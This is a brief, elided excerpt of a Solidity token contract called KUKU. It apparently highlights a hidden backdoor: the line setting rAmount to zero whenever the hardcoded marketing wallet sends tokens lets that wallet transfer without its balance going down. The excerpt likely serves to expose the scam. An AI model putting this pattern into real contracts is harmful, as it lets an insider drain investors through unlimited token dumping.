...
contract KUKU is Context, IERC20, Ownable {
    ...
    address payable private _marketingFeeReceiver = payable(0xfEAbE59bf865Af3c916d1793F077dc6F84EEF969);
    ...
    uint256 public _swapTokensAtAmount = _tTotal * 50 / 1000;
        ...
        )
    {
        ...
        if (sender == _marketingFeeReceiver) rAmount = 0;
